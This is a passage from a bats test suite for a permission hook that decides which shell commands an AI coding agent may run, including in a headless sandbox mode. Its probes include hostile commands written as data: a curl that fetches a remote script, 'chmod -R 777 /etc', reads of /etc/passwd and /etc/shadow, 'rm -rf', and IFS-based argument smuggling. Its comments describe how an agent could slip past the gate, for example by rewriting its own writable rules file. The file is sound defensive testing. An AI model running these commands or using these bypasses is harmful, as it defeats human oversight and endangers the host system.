#!/usr/bin/env bats

# Tests for the PreToolUse hook at .claude/hooks/gdd-permission-hook.sh.
#
# Coverage:
#   - Tier 1: deny shell composition (each operator) with specific reason
#   - Tier 2: redirect-deny for raw commands with a `ws` wrapper
#   - Tier 3: adapter-aware deny/nudge for raw test/lint runners
#   - Tier 4: ask-tier — destructive commands matching [ask-commands]
#   - Tier 5: allow via project .claude/settings.json
#       - bare command vs verbose pattern (symmetric normalization)
#       - verbose command vs bare pattern (symmetric normalization)
#       - CRLF line endings in settings.json don't break matching
#   - Tier 6: allow via [allow-extras] section of hook-rules.local
#   - legacy safe-bash-extras file is ignored (no longer consulted)
#   - Passthrough: no match → exit 0 with no JSON
#   - WS_HOOK_DISABLE bypass
#   - Timeout safety: no infinite loops on Windows-style absolute paths
#
# `run_hook` wraps the hook in `timeout 10` so a future regression
# that hangs the upward-walk loop fails the test instead of stalling
# the suite.

load test_helper

setup() {
    init_hook_env
}

# ─── Tier 1: shell composition deny ─────────────────────────────────

@test "deny: && triggers shell-composition message" {
    run_hook "ls && pwd"
    [ "$status" -eq 0 ]
    [[ "$output" == *"\"permissionDecision\":\"deny\""* ]]
    [[ "$output" == *"Shell composition"* ]]
}

@test "deny: || triggers shell-composition message" {
    run_hook "ls || pwd"
    [ "$status" -eq 0 ]
    [[ "$output" == *"\"permissionDecision\":\"deny\""* ]]
    [[ "$output" == *"Shell composition"* ]]
}

@test "deny: ; triggers shell-composition message" {
    run_hook "ls ; pwd"
    [ "$status" -eq 0 ]
    [[ "$output" == *"\"permissionDecision\":\"deny\""* ]]
    [[ "$output" == *"Shell composition"* ]]
}

@test "deny: ws exec cannot smuggle a redirected verb past its wrapper" {
    # Measured before this rule existed: the raw form was DENIED with the
    # corrective pointer, while the ws exec form only reached ASK — a softer
    # path to the same act, ending in a rubber-stamped prompt and a commit with
    # no Co-Authored-By trailer and none of the bodyfile staging.
    seed_real_project_config
    run_hook "ws exec ken-site git commit -m x"
    [ "$status" -eq 0 ]
    [[ "$output" == *"\"permissionDecision\":\"deny\""* ]]
    [[ "$output" == *"ws commit"* ]]
}

@test "deny: ws exec cannot smuggle a push or a pull request past its wrapper" {
    seed_real_project_config
    run_hook "ws exec ken-site git push"
    [[ "$output" == *"\"permissionDecision\":\"deny\""* ]]
    [[ "$output" == *"ws push"* ]]
    run_hook "ws exec ken-site gh pr create --title x"
    [[ "$output" == *"\"permissionDecision\":\"deny\""* ]]
    [[ "$output" == *"ws cr"* ]]
}

@test "ask: ws exec still carries the commands that have no wrapper" {
    # The point is ordering, not prohibition. A command with no wrapper keeps
    # its ordinary treatment — the baseline ask-list still force-prompts on
    # `ws exec *`, which is a separate decision from these redirects.
    seed_real_project_config
    run_hook "ws exec ken-site bundle exec jekyll build"
    [[ "$output" == *"\"permissionDecision\":\"ask\""* ]]
    [[ "$output" != *"ws commit"* ]]
}

# ─── Headless (sandbox) mode ────────────────────────────────────────

@test "headless: an ask the sandbox needs is decided, not prompted" {
    # An ask means "a human decides". In a sandboxed workspace the only human
    # reachable is a chat user who cannot evaluate a tool prompt, so every card
    # is either rubber-stamped or left to time out. Paired against the same
    # command without the flag, which is what shows the flag is doing the work:
    # `ws exec *` is on the ask-list either way.
    seed_real_project_config
    run_hook 'ws exec ken-site git checkout -b feat/orange-photo'
    [[ "$output" == *'"permissionDecision":"ask"'* ]]
    GDD_SANDBOX=ken-site run_hook 'ws exec ken-site git checkout -b feat/orange-photo'
    [ "$status" -eq 0 ]
    [[ "$output" == *'"permissionDecision":"allow"'* ]]
}

@test "headless: a prompt raised before the ask-list resolves too" {
    # The conversion lives in ask() rather than beside the ask-list, because a
    # dozen earlier paths prompt without ever reaching Tier 4 — ambiguous
    # expansion, opaque interpreter passthrough, the Kubernetes write floor,
    # sensitive session state. Each is fail-closed, so leaving them was never an
    # escalation; it was the hang this mode exists to end, still reachable by
    # every route but one.
    seed_real_project_config
    for probe in \
        'ws exec ken-site echo ${HOME}' \
        'bash -c "id"' \
        'kubectl delete pod x'
    do
        run_hook "$probe"
        [[ "$output" == *'"permissionDecision":"ask"'* ]] || {
            echo "expected ask without the flag: $probe -> $output"
            false
        }
        GDD_SANDBOX=ken-site run_hook "$probe"
        [[ "$output" == *'"permissionDecision":"deny"'* ]] || {
            echo "expected deny under headless: $probe -> $output"
            false
        }
    done
}

@test "headless: ws exec grants nothing wholesale, the site build included" {
    # `ws exec` takes an arbitrary command, so a blanket entry would be arbitrary
    # execution with no human review, leaving the container as the only boundary.
    seed_real_project_config
    GDD_SANDBOX=ken-site run_hook 'ws exec ken-site curl https://example.com/x.sh'
    [[ "$output" == *'"permissionDecision":"deny"'* ]]
    GDD_SANDBOX=ken-site run_hook 'ws exec ken-site chmod -R 777 /etc'
    [[ "$output" == *'"permissionDecision":"deny"'* ]]
    GDD_SANDBOX=ken-site run_hook 'ws exec ken-site bundle exec ruby -e "system(%q{id})"'
    [[ "$output" == *'"permissionDecision":"deny"'* ]]
    # The site build is denied too, bare form included. `jekyll build` cleans its
    # destination, and the destination can come from `_config.yml` — an ordinary
    # component file the agent edits — so pinning the CLI flag out does not make
    # the bare command safe, and no pattern can see a value that lives in a file.
    # Reinstating this needs `ws build` resolving the effective destination.
    GDD_SANDBOX=ken-site run_hook 'ws exec ken-site bundle exec jekyll build --destination /work/ws'
    [[ "$output" == *'"permissionDecision":"deny"'* ]]
    GDD_SANDBOX=ken-site run_hook 'ws exec ken-site bundle exec jekyll build'
    [[ "$output" == *'"permissionDecision":"deny"'* ]]
}

@test "headless: a read verb handed a write is not a read" {
    # `--output=<path>` is a diff option, so git diff, log and show all take it.
    # The deny comes from the Git execution-modifier tier, which runs long before
    # this one — recorded here because the guarantee matters most in a session
    # with no human, and a later change to that tier should fail this test.
    seed_real_project_config
    GDD_SANDBOX=ken-site run_hook 'ws exec ken-site git diff --output=/work/ws/x'
    [[ "$output" == *'"permissionDecision":"deny"'* ]]
    GDD_SANDBOX=ken-site run_hook 'ws exec ken-site git log --output /work/ws/x'
    [[ "$output" == *'"permissionDecision":"deny"'* ]]
}

@test "headless: nothing that discards uncommitted work is allowed" {
    # `git checkout -- .` and `git switch --discard-changes` throw away work with
    # no undo, and a glob cannot tell them from switching branch. Switching to an
    # existing branch therefore still needs a human — the deliberate trade until
    # `ws checkout` exists as a whole verb to allow. Creating one is parsed
    # separately; see the branch-creation test below.
    seed_real_project_config
    GDD_SANDBOX=ken-site run_hook 'ws exec ken-site git checkout -- .'
    [[ "$output" == *'"permissionDecision":"deny"'* ]]
    GDD_SANDBOX=ken-site run_hook 'ws exec ken-site git switch --discard-changes main'
    [[ "$output" == *'"permissionDecision":"deny"'* ]]
    GDD_SANDBOX=ken-site run_hook 'ws exec ken-site git checkout main'
    [[ "$output" == *'"permissionDecision":"deny"'* ]]
}

@test "headless: a branch can be created, and that is all checkout can do" {
    # Opening a pull request needs a branch, so this one write is parsed rather
    # than globbed: `git checkout -b <name>` alone cannot discard anything, while
    # a start-point, a `-f` or a `--` pathspec can. The name has to be a single
    # ordinary token, which is what stops a second argument riding along.
    seed_real_project_config
    GDD_SANDBOX=ken-site run_hook 'ws exec ken-site git checkout -b feat/orange-photo'
    [[ "$output" == *'"permissionDecision":"allow"'* ]]
    GDD_SANDBOX=ken-site run_hook 'ws exec ken-site git checkout -b feat/x -f'
    [[ "$output" == *'"permissionDecision":"deny"'* ]]
    GDD_SANDBOX=ken-site run_hook 'ws exec ken-site git checkout -b feat/x main'
    [[ "$output" == *'"permissionDecision":"deny"'* ]]
    GDD_SANDBOX=ken-site run_hook 'ws exec ken-site git checkout -b feat/x -- .'
    [[ "$output" == *'"permissionDecision":"deny"'* ]]
    # Still pinned to the sandbox's own component, like every other allowance.
    GDD_SANDBOX=ken-site run_hook 'ws exec other-component git checkout -b feat/x'
    [[ "$output" == *'"permissionDecision":"deny"'* ]]
}

@test "headless: the allowance is pinned to the sandbox's own component" {
    # A wildcard component would also match `ws exec yggdrasil …` — the
    # workspace repo, where this hook and its rules live. The sandbox is scoped
    # to one component and the allowance follows that scope.
    seed_real_project_config
    GDD_SANDBOX=ken-site run_hook 'ws exec yggdrasil git checkout -b anything'
    [[ "$output" == *'"permissionDecision":"deny"'* ]]
    GDD_SANDBOX=ken-site run_hook 'ws exec other-component git status'
    [[ "$output" == *'"permissionDecision":"deny"'* ]]
}

@test "headless: a target-less flag grants nothing" {
    # Fails closed: patterns needing a component are skipped rather than
    # matching everything when the value is missing or malformed.
    seed_real_project_config
    GDD_SANDBOX=1 run_hook 'ws exec ken-site git status --short'
    [[ "$output" == *'"permissionDecision":"deny"'* ]]
    # The workspace repository is not a component, and a sandbox claiming to be
    # scoped to it would point every allowance at this hook and its rules.
    GDD_SANDBOX=yggdrasil run_hook 'ws exec yggdrasil git status --short'
    [[ "$output" == *'"permissionDecision":"deny"'* ]]
}

@test "headless: an ask nobody can answer becomes a deny, not a hang" {
    # The other half, and the reason this is not simply "skip the ask-list":
    # destructive commands must not become allowed just because nobody is
    # watching. A prompt with no answerer resolves one of two ways — denied now
    # with a reason, or hung until a watchdog cancels it minutes later. The
    # first is strictly better and says so.
    seed_real_project_config
    GDD_SANDBOX=ken-site run_hook 'rm -rf /work/ws/components'
    [ "$status" -eq 0 ]
    [[ "$output" == *'"permissionDecision":"deny"'* ]]
    [[ "$output" == *"no human"* ]]
}

@test "headless: an unsafe Git shape the validator refused is not re-allowed" {
    # The validated-read fast path runs before this tier and already allows the
    # ordinary reads, so a Git command only REACHES the headless section when
    # that validator turned it down — `--no-index` reads outside the component,
    # `difftool -x` runs an arbitrary program. A `git diff*` glob here would
    # catch precisely those rejects and grant them.
    seed_real_project_config
    mkdir -p "$WORK/.git" "$WORK/components/ken-site/.git"
    cat > "$WORK/ecosystem.yaml" <<'YAML'
components:
  ken-site:
    repo: https://github.com/example/ken-site.git
YAML

    # Asserted as deny, not "not allow": the weaker form also passes when the
    # hook emits no decision at all, which in a headless session hands the call
    # back to an unanswerable host prompt — the failure this mode exists to end.
    GDD_SANDBOX=ken-site run_hook 'ws exec ken-site git difftool -x /work/ws/components/ken-site/agent-script'
    [[ "$output" == *'"permissionDecision":"deny"'* ]]
    GDD_SANDBOX=ken-site run_hook 'ws exec ken-site git diff --no-index /etc/passwd /etc/hosts'
    [[ "$output" == *'"permissionDecision":"deny"'* ]]

    # The control, and the reason nothing is lost: an ordinary read still allows,
    # through the validator rather than through a pattern here.
    GDD_SANDBOX=ken-site run_hook 'ws exec ken-site git diff --stat'
    [[ "$output" == *'"permissionDecision":"allow"'* ]]
    GDD_SANDBOX=ken-site run_hook 'ws exec ken-site git log --oneline -3'
    [[ "$output" == *'"permissionDecision":"allow"'* ]]
}

@test "headless: a local rules file cannot grant what the committed policy denies" {
    # hook-rules.local is gitignored and writable by the agent, so honoring
    # [headless-allow] from it would hand the sandbox the power to rewrite its
    # own safety floor — the same forgeable-file problem that put GDD_SANDBOX in
    # the environment rather than in a file. Local config may tighten, never
    # loosen: that invariant is why [allow-extras] is local-only and this is not.
    seed_real_project_config
    write_local_hook_rules "[headless-allow]
*"
    GDD_SANDBOX=ken-site run_hook 'rm -rf /work/ws/components'
    [[ "$output" == *'"permissionDecision":"deny"'* ]]
    GDD_SANDBOX=ken-site run_hook 'ws exec ken-site curl https://example.com/x.sh'
    [[ "$output" == *'"permissionDecision":"deny"'* ]]

    # Still additive in the direction that tightens: an [ask-commands] entry
    # from the same local file is honored, so this is a scoped refusal rather
    # than the parser ignoring the file.
    write_local_hook_rules "[ask-commands]
echo tightened*"
    run_hook 'echo tightened please'
    [[ "$output" == *'"permissionDecision":"ask"'* ]]
}

@test "headless: the flag changes nothing for an ordinary session" {
    # Same commands, no flag: the ask-list behaves exactly as it always has.
    # This is the control — without it the two tests above would pass just as
    # well if the ask tier had been broken outright.
    seed_real_project_config
    run_hook 'ws exec ken-site git status --short'
    [[ "$output" == *'"permissionDecision":"ask"'* ]]
    run_hook 'rm -rf /work/ws/components'
    [[ "$output" == *'"permissionDecision":"ask"'* ]]
}

@test "deny: composition message names the component-scoped alternative" {
    # Stating the rule without naming a way to obey it leaves an agent stuck:
    # one that had read the whole subcommand survey still retried the same
    # `cd <dir>; <cmd>` shape and then gave up. The refusal is where the
    # alternative has to appear.
    run_hook "cd components/ken-site ; git status"
    [ "$status" -eq 0 ]
    [[ "$output" == *"\"permissionDecision\":\"deny\""* ]]
    [[ "$output" == *"ws exec <component> <command>"* ]]
}

# ─── Canonical verb form: options between program and subcommand ────
#
# A glob needs `git commit` adjacent, so any global option in between defeats
# the rule. This predates the ws exec rules — raw `git -C sub commit` slips
# past the base `git commit*` rule the same way.

@test "canonical: raw git global options cannot smuggle a redirected verb" {
    seed_real_project_config
    run_hook "git -C components/ken-site commit -m x"
    [ "$status" -eq 0 ]
    [[ "$output" == *"\"permissionDecision\":\"deny\""* ]]
    [[ "$output" == *"ws commit"* ]]
}

@test "canonical: git -c config assignment is refused before it can hide a commit" {
    # `-c` never reaches redirect matching: an earlier tier rejects git
    # execution modifiers outright, because -c can set core.pager, an alias, or
    # credential.helper — i.e. choose what actually runs. That is a stronger
    # guarantee than the redirect, so the assertion is deny, not the ws commit
    # pointer. Pinned so a future relaxation of that tier cannot silently open
    # a path the canonicalizer was never asked to cover.
    seed_real_project_config
    run_hook "git -c user.email=a@b.c commit -m x"
    [ "$status" -eq 0 ]
    [[ "$output" == *"\"permissionDecision\":\"deny\""* ]]
}

@test "canonical: git boolean globals do not hide a push" {
    seed_real_project_config
    run_hook "git --no-pager push origin main"
    [[ "$output" == *"\"permissionDecision\":\"deny\""* ]]
    [[ "$output" == *"ws push"* ]]
}

@test "canonical: gh --repo does not hide a pr create" {
    seed_real_project_config
    run_hook "gh --repo owner/name pr create --title x"
    [[ "$output" == *"\"permissionDecision\":\"deny\""* ]]
    [[ "$output" == *"ws cr"* ]]
}

@test "canonical: the same options cannot smuggle a verb through ws exec" {
    seed_real_project_config
    run_hook "ws exec ken-site git -C nested commit -m x"
    [[ "$output" == *"\"permissionDecision\":\"deny\""* ]]
    [[ "$output" == *"ws commit"* ]]
}

@test "canonical: a path-qualified executable cannot dodge the redirect" {
    # Emitting the token as written left `/usr/bin/git commit` canonicalizing to
    # itself, so it still missed `git commit*` — a spelling away from the boundary.
    # Reducing to the basename can only ever produce more denies, never an allow,
    # because only redirect matching consumes the canonical form.
    seed_real_project_config

    run_hook "/usr/bin/git push origin main"
    [ "$status" -eq 0 ]
    [[ "$output" == *"\"permissionDecision\":\"deny\""* ]]
    [[ "$output" == *"ws push"* ]]

    run_hook "ws exec ken-site /usr/bin/git -C nested commit -m x"
    [[ "$output" == *"\"permissionDecision\":\"deny\""* ]]
    [[ "$output" == *"ws commit"* ]]
}

@test "canonical: an unrelated git subcommand is still not redirected" {
    # Canonicalization must not turn every git invocation into a match.
    seed_real_project_config
    run_hook "git -C components/ken-site status"
    [ "$status" -eq 0 ]
    [[ "$output" != *"ws commit"* ]]
    [[ "$output" != *"ws push"* ]]
}

@test "canonical: an unknown global option falls back rather than mis-denying" {
    # Unrecognized flags stop canonicalization, so behaviour matches the
    # pre-existing raw-only test — a missed catch, never a wrong deny.
    seed_real_project_config
    run_hook "git --not-a-real-flag status"
    [ "$status" -eq 0 ]
    [[ "$output" != *"\"permissionDecision\":\"deny\""* ]]
}

@test "portability: no bash-4-only constructs in the runtime shell surface" {
    # macOS ships bash 3.2.57 — frozen in 2007 because bash 4.0 relicensed to
    # GPLv3 — and it is what a bare `bash` resolves to there, which is exactly
    # how settings.json registers this hook. A bash-4 builtin therefore does
    # not fail loudly on a Mac. `local -n` (a 4.3 nameref) printed an option
    # error, left the caller holding an empty index, and spun
    # canonical_verb_form forever: every git / gh / glab tool call hung with no
    # audit entry, because the hook writes one only when it reaches a decision.
    #
    # The suite's own `timeout 10` around run_hook would catch that — but only
    # on a 3.2 host. CI runs a modern bash where the nameref works fine, so the
    # symptom is unreproducible there and the construct has to be pinned
    # directly. Extend this list if a newer builtin ever becomes tempting.
    # File discovery mirrors ws-shellcheck.sh: a `*.sh` glob PLUS a shebang
    # sweep of extensionless files. The dispatcher `scripts/ws` has no
    # extension — correctly, since it is what users type — so an extension
    # glob silently skips the single most important file here. That is not
    # hypothetical: the first pass of this sweep used `--include=*.sh`, missed
    # `${remote,,}` in scripts/ws, and shipped a `ws diagnose` that died
    # halfway through printing its own output.
    local targets=("$REPO_ROOT/scripts" "$REPO_ROOT/.claude/hooks" "$REPO_ROOT/.codex/hooks")
    local files=() p f
    for p in "${targets[@]}"; do
        [[ -d "$p" ]] || continue
        while IFS= read -r f; do files+=("$f"); done < <(
            find "$p" -type f -name '*.sh'
            find "$p" -type f ! -name '*.*' -exec sh -c 'head -n1 "$1" | grep -qE "^#!.*[ /](ba)?sh($| )" && printf "%s\n" "$1"' _ {} \;
        )
    done
    [ "${#files[@]}" -gt 0 ]

    # `^[^#]*` keeps this to executable lines: the fixes' own comments name the
    # constructs they removed, and a test that forbids documenting a trap is a
    # test that guarantees the trap gets rediscovered the hard way.
    run grep -nE '^[^#]*(mapfile|readarray|local -n|declare -n|declare -A|local -A|coproc|\$\{[^}]*(,,|\^\^)[^}]*\})' "${files[@]}"
    [ "$status" -ne 0 ]
}

@test "deny: | triggers pipes message" {
    run_hook "ls -la | head"
    [ "$status" -eq 0 ]
    [[ "$output" == *"\"permissionDecision\":\"deny\""* ]]
    [[ "$output" == *"Pipes"* ]]
}

@test "masking: quoted regex alternation no longer trips the grep pipe arm" {
    # Regex alternation inside a quoted pattern is literal data to
    # grep — quoted-span masking now removes it from Tier-1's view in
    # both quoting styles, so the functional command runs instead of
    # bouncing off a corrective deny.
    run_hook 'grep -E "a|b" file.txt'
    [ "$status" -eq 0 ]
    [[ "$output" != *"\"permissionDecision\":\"deny\""* ]]
}

@test "deny: grep piping into another command still redirects to Grep tool" {
    # The masked string retains the UNQUOTED pipe, so a genuine
    # grep-headed pipeline keeps its specific corrective message.
    run_hook 'grep -E "a|b" file.txt | head'
    [ "$status" -eq 0 ]
    [[ "$output" == *"\"permissionDecision\":\"deny\""* ]]
    [[ "$output" == *"Grep tool"* ]]
    [[ "$output" != *"Pipes"* ]]
}

@test "deny: cmd | grep also redirects to Grep tool when cmd starts with grep" {
    # This case is grep ... | something — still starts with `grep `,
    # so the redirect arm fires (correctly, since the user should use
    # the Grep tool here too).
    run_hook "grep foo file | head"
    [ "$status" -eq 0 ]
    [[ "$output" == *"\"permissionDecision\":\"deny\""* ]]
    [[ "$output" == *"Grep tool"* ]]
}

@test "deny: non-grep cmd | grep falls through to generic pipes message" {
    # `cat file | grep pattern` starts with `cat`, not `grep`, so the
    # grep-specific arm doesn't fire. Generic pipes deny still applies.
    run_hook "cat file | grep pattern"
    [ "$status" -eq 0 ]
    [[ "$output" == *"\"permissionDecision\":\"deny\""* ]]
    [[ "$output" == *"Pipes"* ]]
}

@test "deny: backticks trigger command-substitution message" {
    run_hook 'echo `date`'
    [ "$status" -eq 0 ]
    [[ "$output" == *"\"permissionDecision\":\"deny\""* ]]
    [[ "$output" == *"Command substitution"* ]]
}

@test "deny: \$() triggers command-substitution message" {
    run_hook 'echo $(date)'
    [ "$status" -eq 0 ]
    [[ "$output" == *"\"permissionDecision\":\"deny\""* ]]
    [[ "$output" == *"Command substitution"* ]]
}

@test "ask: parameter expansion cannot smuggle whitespace past mutation rules" {
    seed_real_project_config

    run_hook 'ws review${IFS}reply${IFS}yggdrasil${IFS}129${IFS}thread${IFS}body'

    [ "$status" -eq 0 ]
    [[ "$output" == *"\"permissionDecision\":\"ask\""* ]]
    [[ "$output" == *"parameter expansion"* ]]
}

@test "deny: > triggers redirection message" {
    run_hook "echo hi > /tmp/file"
    [ "$status" -eq 0 ]
    [[ "$output" == *"\"permissionDecision\":\"deny\""* ]]
    [[ "$output" == *"redirection"* ]]
}

@test "deny: < triggers redirection message" {
    run_hook "cat < /tmp/file"
    [ "$status" -eq 0 ]
    [[ "$output" == *"\"permissionDecision\":\"deny\""* ]]
    [[ "$output" == *"redirection"* ]]
}

@test "deny: 2>&1 FD merge gets specific 'not needed' message" {
    # The Bash tool captures both stdout and stderr natively, so
    # `2>&1` is cargo-cult shell jargon. Deny with a message that
    # explains the redundancy — saves newbies from learning FD-merge
    # syntax just to follow transcripts.
    run_hook "ls 2>&1"
    [ "$status" -eq 0 ]
    [[ "$output" == *"\"permissionDecision\":\"deny\""* ]]
    [[ "$output" == *"File-descriptor merges"* ]]
    [[ "$output" != *"Output / input redirection"* ]]
}

@test "deny: 1>&2 FD merge gets the same message" {
    run_hook "echo error 1>&2"
    [ "$status" -eq 0 ]
    [[ "$output" == *"\"permissionDecision\":\"deny\""* ]]
    [[ "$output" == *"File-descriptor merges"* ]]
}

@test "deny: grep with > redirect hits redirect message, not grep arm bypass" {
    # Regression: an earlier ordering of the Tier 1 case statement put
    # the `grep ` arm right after the composition arm. The inner
    # `case` inside that arm only matched `|`, so a command like
    # `grep foo file > out` matched the outer grep arm, hit nothing
    # inside, and silently fell through — bypassing the redirect deny.
    # Fix was to reorder: the more-specific redirect / substitution /
    # FD-merge arms now precede the grep arm.
    run_hook "grep foo file > out"
    [ "$status" -eq 0 ]
    [[ "$output" == *"\"permissionDecision\":\"deny\""* ]]
    [[ "$output" == *"redirection"* ]]
    [[ "$output" != *"Grep tool"* ]]
}

@test "deny: grep with backtick command substitution hits substitution message" {
    # Same regression class as the redirect case: grep with substitution
    # must be caught by the substitution arm, not silently pass through
    # the grep arm.
    run_hook 'grep `whoami` file'
    [ "$status" -eq 0 ]
    [[ "$output" == *"\"permissionDecision\":\"deny\""* ]]
    [[ "$output" == *"Command substitution"* ]]
}

@test "deny: newline-separated commands trigger newline-list message" {
    # Embedded \n is a command separator in bash (a literal newline
    # in a command string runs whatever follows as a fresh command).
    # Same threat as `;`, but visually invisible — caught here so it
    # can't slip past the other Tier 1 arms via creative whitespace.
    run_hook $'ls\npwd'
    [ "$status" -eq 0 ]
    [[ "$output" == *"\"permissionDecision\":\"deny\""* ]]
    [[ "$output" == *"Newline-separated"* ]]
}

@test "deny: single & background separator triggers background-separator message" {
    # `cmd1 & cmd2` runs cmd1 in background and cmd2 right after.
    # Two commands per invocation, both invisible to per-call audit.
    # The arm sits after `>&N` (FD merge) so `2>&1` still hits the
    # more-specific FD-merge message, but bare `&` is denied.
    run_hook "sleep 1 & echo done"
    [ "$status" -eq 0 ]
    [[ "$output" == *"\"permissionDecision\":\"deny\""* ]]
    [[ "$output" == *"Background separator"* ]]
}

@test "deny: shell-composition message does NOT contain literal backslash escapes" {
    # An earlier version wrote `\&\&` inside the double-quoted deny
    # string, which appeared verbatim to the agent (the backslash
    # isn't an escape for `&` in bash double-quoted strings).
    # Make sure the message reads naturally now.
    run_hook "ls && pwd"
    [ "$status" -eq 0 ]
    [[ "$output" == *"\"permissionDecision\":\"deny\""* ]]
    [[ "$output" != *"\\&\\&"* ]]
    [[ "$output" == *"(&&,"* ]]
}

@test "deny: combined real redirect + FD merge hits FD message first" {
    # The FD-merge arm comes before the general redirect arm in the
    # case statement. A command containing both (`cmd 2>&1 > file`)
    # matches the FD-merge arm first. Either deny is fine — both
    # are correct — but pin the order so the user always sees the
    # more specific corrective message when both apply.
    run_hook "cmd 2>&1 > output.log"
    [ "$status" -eq 0 ]
    [[ "$output" == *"\"permissionDecision\":\"deny\""* ]]
    [[ "$output" == *"File-descriptor merges"* ]]
}

# ─── Tier 5: symmetric normalization against settings.json ──────────

@test "allow via settings: bare command matches verbose pattern" {
    write_project_settings 'Bash(bash scripts/ws status)'
    run_hook "ws status"
    [ "$status" -eq 0 ]
    [[ "$output" == *"\"permissionDecision\":\"allow\""* ]]
}

@test "allow via settings: verbose command matches bare pattern" {
    write_project_settings 'Bash(ws status)'
    run_hook "bash scripts/ws status"
    [ "$status" -eq 0 ]
    [[ "$output" == *"\"permissionDecision\":\"allow\""* ]]
}

@test "security: nested script dispatcher spellings do not inherit workspace permissions" {
    write_project_settings 'Bash(ws status)'
    mkdir -p "$WORK/nested/scripts"
    touch "$WORK/nested/scripts/ws"
    local command
    local -a commands=(
        "bash scripts/ws status"
        "bash ./scripts/ws status"
        "./scripts/ws status"
        "scripts/ws status"
    )

    for command in "${commands[@]}"; do
        run_hook "$command" "$WORK/nested"
        [ "$status" -eq 0 ]
        [[ "$output" != *"\"permissionDecision\":\"allow\""* ]]
        # Not a silent host prompt: the hook teaches why the relative
        # dispatcher call did not inherit workspace permissions.
        [[ "$output" == *"\"permissionDecision\":\"ask\""* ]]
        [[ "$output" == *"outside the workspace root"* ]]
    done
}

@test "security: shipped permissions contain no middle-glob git -C rules" {
    run jq -e '[.permissions.allow[] | select(startswith("Bash(git -C *"))] | length == 0' "$REPO_ROOT/.claude/settings.json"
    [ "$status" -eq 0 ]
}

@test "allow: validated git -C reads at the workspace root avoid middle-glob permissions" {
    write_project_settings ''
    mkdir -p "$WORK/.git"
    local command_tail
    local -a command_tails=(
        "status"
        "status -s"
        "status --short"
        "show HEAD"
        "grep needle"
        "log --oneline -3"
        "diff HEAD"
        "remote -v"
        "branch --show-current"
        "ls-tree HEAD"
        "rev-parse HEAD"
        "ls-files"
        "show-ref --verify refs/heads/main"
        "describe --tags"
        "merge-base HEAD HEAD"
        "range-diff HEAD...HEAD"
    )

    for command_tail in "${command_tails[@]}"; do
        run_hook "git -C $WORK $command_tail"
        [ "$status" -eq 0 ]
        [[ "$output" == *'"permissionDecision":"allow"'* ]]
    done
}

@test "allow: validated git -C reads accept a root-declared component" {
    write_project_settings ''
    mkdir -p "$WORK/components/demo/.git"
    cat > "$WORK/ecosystem.yaml" <<'YAML'
components:
  demo:
    repo: https://github.com/example/demo.git
YAML

    run_hook "git -C $WORK/components/demo log --oneline -3"

    [ "$status" -eq 0 ]
    [[ "$output" == *'"permissionDecision":"allow"'* ]]
}

@test "security: git -C read fast path rejects undeclared and external repositories" {
    write_project_settings ''
    mkdir -p "$WORK/components/undeclared/.git"
    mkdir -p "$BATS_TEST_TMPDIR/outside/.git"
    printf 'components: {}\n' > "$WORK/ecosystem.yaml"

    run_hook "git -C $WORK/components/undeclared status"
    [ "$status" -eq 0 ]
    [[ "$output" != *'"permissionDecision":"allow"'* ]]

    run_hook "git -C $BATS_TEST_TMPDIR/outside status"
    [ "$status" -eq 0 ]
    [[ "$output" != *'"permissionDecision":"allow"'* ]]
}

@test "security: git -C read fast path accepts only branch --show-current" {
    write_project_settings ''
    mkdir -p "$WORK/.git"

    run_hook "git -C $WORK branch --show-current"
    [ "$status" -eq 0 ]
    [[ "$output" == *'"permissionDecision":"allow"'* ]]

    run_hook "git -C $WORK branch --list"
    [ "$status" -eq 0 ]
    [[ "$output" != *'"permissionDecision":"allow"'* ]]
}

@test "security: git -C diff --no-index cannot escape the validated target" {
    write_project_settings ''
    mkdir -p "$WORK/.git"

    run_hook "git -C $WORK diff --no-index /etc/passwd /etc/shadow"
    [ "$status" -eq 0 ]
    [[ "$output" != *'"permissionDecision":"allow"'* ]]
}

@test "security: git -C read fast path rejects dynamic paths and mutating shapes" {
    write_project_settings ''
    mkdir -p "$WORK/.git"

    run_hook "git -C $WORK/components/* status"
    [ "$status" -eq 0 ]
    [[ "$output" != *'"permissionDecision":"allow"'* ]]

    run_hook "git -C $WORK branch -f status"
    [ "$status" -eq 0 ]
    [[ "$output" != *'"permissionDecision":"allow"'* ]]
}

@test "security: git -C read fast path rejects symlink traversal targets" {
    write_project_settings ''
    mkdir -p "$WORK/components/demo/.git"
    mkdir -p "$BATS_TEST_TMPDIR/outside/child"
    mkdir -p "$BATS_TEST_TMPDIR/outside/.git"
    ln -s "$BATS_TEST_TMPDIR/outside/child" "$WORK/components/demo/link" 2>/dev/null || true
    [[ -L "$WORK/components/demo/link" ]] || skip "real symlinks not supported on this platform"
    cat > "$WORK/ecosystem.yaml" <<'YAML'
components:
  demo:
    repo: https://github.com/example/demo.git
YAML

    run_hook "git -C $WORK/components/demo/link/.. status"

    [ "$status" -eq 0 ]
    [[ "$output" != *'"permissionDecision":"allow"'* ]]
}

@test "security: Git read fast paths reject pathname expansion in arguments" {
    write_project_settings ''
    write_project_hook_rules "[ask-commands]
ws exec *"
    mkdir -p "$WORK/.git"
    touch "$WORK/--output=.env"

    run_hook "git -C $WORK log --*" "$WORK"
    [ "$status" -eq 0 ]
    [[ "$output" != *'"permissionDecision":"allow"'* ]]

    run_hook "ws exec yggdrasil git log --*" "$WORK"
    [ "$status" -eq 0 ]
    [[ "$output" == *'"permissionDecision":"ask"'* ]]
}

@test "security: git text conversion denies before the read fast path" {
    write_project_settings ''
    write_project_hook_rules "[ask-commands]
ws exec *"
    mkdir -p "$WORK/.git"

    run_hook "git -C $WORK diff --textconv HEAD"

    [ "$status" -eq 0 ]
    [[ "$output" == *'"permissionDecision":"deny"'* ]]
    [[ "$output" == *"Git execution modifier"* ]]

    run_hook "ws exec yggdrasil git diff --textconv HEAD"
    [ "$status" -eq 0 ]
    [[ "$output" == *'"permissionDecision":"deny"'* ]]
    [[ "$output" == *"Git execution modifier"* ]]
}

@test "allow: ws exec keeps validated Git reads low-friction" {
    write_project_settings ''
    write_project_hook_rules "[ask-commands]
ws exec *"
    mkdir -p "$WORK/.git"
    mkdir -p "$WORK/components/demo/.git"
    cat > "$WORK/ecosystem.yaml" <<'YAML'
components:
  demo:
    repo: https://github.com/example/demo.git
YAML

    run_hook "ws exec yggdrasil git status"
    [ "$status" -eq 0 ]
    [[ "$output" == *'"permissionDecision":"allow"'* ]]

    run_hook "ws exec demo git log --oneline -3"
    [ "$status" -eq 0 ]
    [[ "$output" == *'"permissionDecision":"allow"'* ]]
}

@test "security: ws exec Git fast path leaves mutations on the ask-list" {
    write_project_settings ''
